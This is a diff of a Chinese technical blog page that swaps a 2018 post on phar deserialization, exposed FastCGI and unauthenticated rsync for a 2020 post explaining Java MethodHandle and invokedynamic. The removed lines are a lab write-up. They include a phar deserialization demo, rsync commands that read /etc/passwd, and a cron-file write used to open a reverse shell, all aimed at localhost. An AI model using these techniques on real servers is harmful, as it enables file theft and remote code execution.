@@ -13,11 +13,11 @@
 
     <title>
         
-          phar &amp; fastcgi &amp; rsync 漏洞小结 - Kingkk&#39;s Blog
+          从MethodHandle到InvokeDynamic指令 - Kingkk&#39;s Blog
         
     </title>
 
-    <link rel="canonical" href="https://www.kingkk/2018/10/phar-fastcgi-rsync-漏洞小结/">
+    <link rel="canonical" href="https://www.kingkk/2020/11/从MethodHandle到InvokeDynamic指令/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -165,12 +165,14 @@
                 <div class="post-heading">
                     <div class="tags">
                         
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
                     </div>
-                    <h1>phar &amp; fastcgi &amp; rsync 漏洞小结</h1>
+                    <h1>从MethodHandle到InvokeDynamic指令</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         Posted by kingkk on
-                        2018-10-14
+                        2020-11-25
                     </span>
                 </div>
             </div>
@@ -189,63 +191,81 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>几个简单复现了下的漏洞类型，但是又我之前没学过的。</p>
-<p>总是喜欢记录一下，但是又不想分开三篇来记录，就合到了一篇里面。</p>
-<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>前段时间black hat会议上新提出的一种攻击手法（但orange师傅2017年就用这个在hitcon出过题）</p>
-<p>主要是利用<code>phar://</code>协议在解析数据的时候，会触发一次<code>unserialize</code>，从而产生反序列化</p>
-<h2 id="phar文件格式"><a href="#phar文件格式" class="headerlink" title="phar文件格式"></a>phar文件格式</h2><p>文件格式里有那么几个比较重要的参数</p>
-<h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>为一个phar的标志，格式为</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="php"><span class="meta">&lt;?php</span> xxx; <span class="comment"><span class="keyword">__HALT_COMPILER</span>();?&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p>后面必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则无法识别</p>
-<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>会以<strong>序列化</strong>形式存储用户自定义的<code>meta-data</code></p>
-<p>也就是这块内容在解析的时候会被反序列化，从而产生反序列化漏洞</p>
-<h3 id="file-contens"><a href="#file-contens" class="headerlink" title="file contens"></a>file contens</h3><p>被压缩的文件内容</p>
-<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>文件签名</p>
-<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>首先测试生成一个<code>phar</code>文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
-<p>主要要设置的就三个值</p>
-<ul>
-<li><code>setStub</code>： 一般为固定值 <code>&lt;?php __HALT_COMPILER(); ?&gt;</code>或者也可以添加一些自定义文件头之类的</li>
-<li><code>setMetadata</code>：需要反序列化的类</li>
-<li><code>addFormString</code>：文件名和文件内容可以随意填，这里文件名（这里为<code>test.txt</code>到后续需要使用</li>
-</ul>
-<p>重命名为<code>1.jpg</code>，然后尝试触发</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="string">'phar://1.jpg/test.txt'</span>;</span><br><span class="line">    file_exists($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/2.png" alt></p>
-<p><code>test.txt</code>就是之前的文件名，成功反序列化</p>
-<p>而且可以触发的函数也比较多</p>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/(phar-fastcgi-rsync-漏洞小结/1.png" alt></p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>需要注意的就是，文件存在的时候需要先删掉才能重建</p>
-<p>文件后缀必须为<code>.phar</code>，但是生成好之后可以改</p>
-<p>这样，无疑极大的拓展了反序列化的攻击面，无需强制使用<code>unserialize</code>。只要能完全控制文件名，甚至文件名的前面一部分，就可以触发反序列化。感觉触发的场景无疑多了许多，主要任务就是寻找pop chain了。</p>
-<h1 id="Fast-cgi未授权访问"><a href="#Fast-cgi未授权访问" class="headerlink" title="Fast-cgi未授权访问"></a>Fast-cgi未授权访问</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Fastcgi是一种跟高效的php与webserver之间通信的协议。</p>
-<p>PHP-FPM是一个fastcgi协议解析器，webserver将用户请求按照fastcgi的规则打包好后传给FPM。</p>
-<p>当fastcgi端口（默认为9000）暴露在公网中时，就可以伪造fastcgi协议通信内容，从而执行php</p>
-<p>当端口没有暴露的时候，也是可以通过SSRF进行攻击的</p>
-<p>具体原理和分析可以看<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>漏洞环境用p神的vulhub</p>
-<p><a href="https://github.com/vulhub/vulhub/tree/master/fpm" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fpm</a></p>
-<p>脚本</p>
-<p><a href="https://github.com/kingkaki/Exploit-scripts/blob/master/fast-cgi/fpm.py" target="_blank" rel="noopener">https://github.com/kingkaki/Exploit-scripts/blob/master/fast-cgi/fpm.py</a></p>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/3.png" alt></p>
-<h1 id="rsync-未授权访问漏洞"><a href="#rsync-未授权访问漏洞" class="headerlink" title="rsync 未授权访问漏洞"></a>rsync 未授权访问漏洞</h1><blockquote>
-<p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前在用ASM处理字节码的时候，发现rt.jar中居然有比较多的invokedynamic指令，并且ASM对该指令提供了一个单独的结构体来描述<code>InvokeDynamicInsnNode</code>，甚至不能一眼看出这个指令具体调用了个什么方法。</p>
+<p>之后便翻了几天文档和一些文章，在这里做一下记录，文章难免有疏漏，欢迎指出。</p>
+<h1 id="MethodHandle"><a href="#MethodHandle" class="headerlink" title="MethodHandle"></a>MethodHandle</h1><p>MethodHanlde是Java7之后出现的API，以及其相关的类都在<code>java.lang.invoke</code>包中。</p>
+<p>文档中对它的定义是这样的</p>
+<blockquote>
+<p> 方法句柄是对基础方法，构造函数，字段或类似的低级操作的类型化，直接可执行的引用，并带有自变量或返回值的可选转换。 </p>
 </blockquote>
-<p>在没有设置密码的时候，就可以任意文件读取和写入，在内网渗透的时候用处较大</p>
-<p>可以通过访问<code>/src</code>目录看到备份了的文件</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span></span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">rsync</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">::src</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/4.png" alt></p>
-<p>任意文件下载</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av  rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span>etc<span class="regexp">/passwd ./</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/5.png" alt></p>
-<p>还可以写入文件，例如写一个定时任务，反弹shell</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av shell rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span>etc<span class="regexp">/cron.d/</span>shell</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/6.png" alt></p>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
-<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
-<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>
+<p>方法句柄的操作其实和<code>java.lang.reflect</code>中的反射操作很类似，先来看下熟悉的通过反射API执行系统命令的操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method exec = Runtime.class.getMethod("exec", String.class);</span><br><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">exec.invoke(runtime, <span class="string">"calc"</span>);</span><br></pre></td></tr></table></figure>
+<p>通过<code>Class.getMethod</code>方法获取到Runtime类的exec方法之后，通过<code>Method.invoke</code>并传入实例和对应参数，即完成了一次反射调用。</p>
+<p>而MethodHandle方法句柄是如何操作的呢？（为了展示清楚，尽可能的将步骤展开成了多步）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MethodType mt = MethodType.methodType(Process<span class="class">.<span class="keyword">class</span>, <span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">MethodHandles.Lookup lookup = MethodHandles.lookup();</span><br><span class="line">MethodHandle handle = lookup.findVirtual(Runtime.class, "exec", mt);</span><br><span class="line">handle = handle.bindTo(runtime);</span><br><span class="line">handle.invoke(<span class="string">"calc"</span>);</span><br></pre></td></tr></table></figure>
+<p>可以明显的看到，原本三行的反射操作，到了MethodHandle这里变成了六行，接下来就是讲解一下每一行的含义。</p>
+<ul>
+<li>MethodType：查找对应时需要定义其类型，由返回类型和参数的类型决定。这部分信息在反射中在<code>Class.getMethod</code>中传入，且不需要返回值的类型。</li>
+<li>Runtime.getRuntime()：获取Runtime实例</li>
+<li>MethodHandles.lookup()：MethodHandle查找器，可以查找到类的所有方法，如果只想查找public方法可以使用MethodHandles.publicLookup()</li>
+<li>lookup.findVirtual()：查找对应类的方法，传入的参数分别为类、函数名、以及MethodType。除了findVirtual，lookup还有findSpecial、findStatic等方法，分别对应JVM的invokevirtual、invokespecial、invokestatic指令。</li>
+<li>handle.bindTo()：到目前为止，获取到了函数对应的MethodHandle，但必须要绑定到一个实例上之后才可以正常使用，而不是像反射时在具体invoke时再传入。</li>
+<li>handle.invoke()：由于已经绑定了具体的实例，最后一步只要传入对应的参数即可通过MethodHandle调用对应函数。</li>
+</ul>
+<p>这样看下来，MethodHandle方法句柄的调用方式明显比reflect反射调用的方式至少在代码层面要繁琐很多。</p>
+<p>并且对于MethodHandle而言，没有<code>Method.setAccessible</code>之类的操作，导致private和protected方法只有在类的内部代码中才能使用。甚至使用方法上甚至还要自己指定对于的JVM调用方式（invokevirutal / invokespecial / invokestatic）。</p>
+<p>那MethodHandle方法在Java7中引入的意义何在呢？</p>
+<p>最大的一个原因是出于性能考虑的，MethodHandle的访问检查是在创建时进行校验的，而不是在实际调用时。这也就意味着生成了一个MethodHandle方法句柄之后，多次调用仅有一次权限检查，而reflect反射会在每次invoke时进行校验。</p>
+<p>并且对于JVM而言，可以完全透视<em>MethodHandle</em>并将尝试对其进行优化，从而获得更好的性能。 </p>
+<h1 id="InvokeDynamic"><a href="#InvokeDynamic" class="headerlink" title="InvokeDynamic"></a>InvokeDynamic</h1><p>除了invokevirutal、invokespecial、invokeinterface、invokestatic之外，在Java7发布之后JVM中引入了一条新的调用函数的指令——invokedynamic</p>
+<p>它实现了类似于python中”鸭子模型”的功能，为一些在JVM上运行的动态语言提供了动态调用的能力，并在之后的java版本中被运用到一些编译优化的地方。</p>
+<p>例如如下是一个Java8中的lambda表达</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokeDynamicTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Runnable lambda = () -&gt; System.out.println(<span class="string">"hello lambda"</span>);</span><br><span class="line">        lambda.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反编译之后可以看到main函数开头的第一个函数就是invokedynamic函数</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125163014.png" alt></p>
+<p>那这个invokedynamic指令究竟是调用了一个什么函数呢？</p>
+<p>事实上，invokedynamic指令可能远不止执行一个函数那么简单。</p>
+<p>在JVM第一次遇到该invokedynamic指令时，会去调用一个特殊的引导方法（Bootstrap Method, BSM），由引导方法初始化调用过程，返回一个CallSite实例。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/Untitled-Diagram.svg" alt></p>
+<p>如下是文档中对CallSite的定义</p>
+<blockquote>
+<p><code>CallSite</code>是变量的持有人<code>MethodHandle</code>，称为它的<code>target</code>。<code>invokedynamic</code>链接到<code>CallSite</code>代表的说明将所有调用委托给该站点的当前目标。 </p>
+</blockquote>
+<p>简而言之CallSite就是封装了一个MehtodHandle的调用站点。</p>
+<p>再来看下Lambda表达式这个中的例子，是如果调用BSM从而生成CallSite进而进行调用的。</p>
+<p>在反编译的invokedynamic指令中可以看到，存在一个<code>#0</code>的引用，该引用就对应了BootstrapMethods中存储的引导方法。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125165056.png" alt></p>
+<p>则说明该引导函数会通过<code>java.lang.invoke.LambdaMetafactory.metafactory</code>生成一个对应的CallSite</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125165321.png" alt></p>
+<p>可以看到<code>metafactory</code>函数提供了六个参数选项，前三个是BSM所必须的，并会由JVM自动传入</p>
+<ul>
+<li>caller：即调用者，这里是<code>InvokeDynamicTest</code>这个类</li>
+<li>invokeName：CallSite的调用名，这里是<code>run</code></li>
+<li>invokeType：CallSite的的函数签名，这里是<code>()Runnable</code></li>
+</ul>
+<p>后面三个参数则是对应上面反编译结果中的Method arguments。</p>
+<p>跟进<code>mf.buildCallSite()</code>之后可以看到，通过<code>spinInnerClass()</code>生成了一个内部类</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125165709.png" alt></p>
+<p><code>spinInnerClass()</code>中则是通过ASM动态生成一个字节码，可以dump下来看下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125165946.png" alt></p>
+<p>dump下来之后可以看到生成了一个继承了<code>Runnable</code>的匿名类，并且其run方法指向我们<code>InvokeDynamicTest</code>中的lambda匿名函数。</p>
+<p><code>InvokeDynamicTest.lambda$main$0</code>的逻辑其实也很简单，就是我们之前在lambda表达式中写入的<code>System.out.println</code>逻辑。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125170232.png" alt></p>
+<p>继续回到<code>buildCallSite</code>逻辑中，生成了这个匿名类之后，通过获取其构造函数，生成一个实例。</p>
+<p>并通过<code>MethodHandles.constant</code>生成一个MethodHandle，该方法句柄每次调用时返回固定的常量值，即之前匿名类的实例。最后再封装层CallSite返回。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125170418.png" alt></p>
+<p>返回CallSite之后，再具体执行返回的MethodHandle，即得到一个Lambda匿名类实例，并赋值给我们程序中的<code>lambda</code>变量，通过debug也可以验证我们这一点。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125170856.png" alt></p>
+<p>最后调用这个匿名类的run方法，进而调用到InvokeDynamicTest中的匿名<code>lambda$main$0</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20201125172252.png" alt></p>
+<p>更高版本的Java中，编译器利用invokedynamic指令对更多操作进行优化，它们各自有着不同的BSM，例如JDK9中的字符串连接，其对应的BSM为<code>java.lang.invoke.StringConcatFactory.makeConcatWithConstants</code>。</p>
+<p>但具体原理依旧是和之前的一样，在第一次调用invokedynamic指令时通过BSM创建对应CallSite，之后每次调用直接执行该CallSite中的MethodHandle。</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/invoke/MethodHandle.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/lang/invoke/MethodHandle.html</a></p>
+<p><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/invoke/CallSite.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/lang/invoke/CallSite.html</a></p>
+<p><a href="https://www.baeldung.com/java-method-handles" target="_blank" rel="noopener">https://www.baeldung.com/java-method-handles</a></p>
+<p><a href="https://www.baeldung.com/java-invoke-dynamic" target="_blank" rel="noopener">https://www.baeldung.com/java-invoke-dynamic</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1005920" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1005920</a></p>
+<p><a href="https://jcp.org/en/jsr/detail?id=292" target="_blank" rel="noopener">https://jcp.org/en/jsr/detail?id=292</a></p>
 
 
                 <hr>
@@ -254,13 +274,9 @@
 
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2018/10/Thinkphp-聚合查询漏洞/" data-toggle="tooltip" data-placement="top" title="ThinkPHP 聚合查询漏洞">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2018/10/护网杯-web/" data-toggle="tooltip" data-placement="top" title="护网杯-web">Next Post &rarr;</a>
+                            <a href="/2020/08/ASM历险记/" data-toggle="tooltip" data-placement="top" title="ASM历险记">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -287,6 +303,8 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
                     </div>
                 </section>
                 
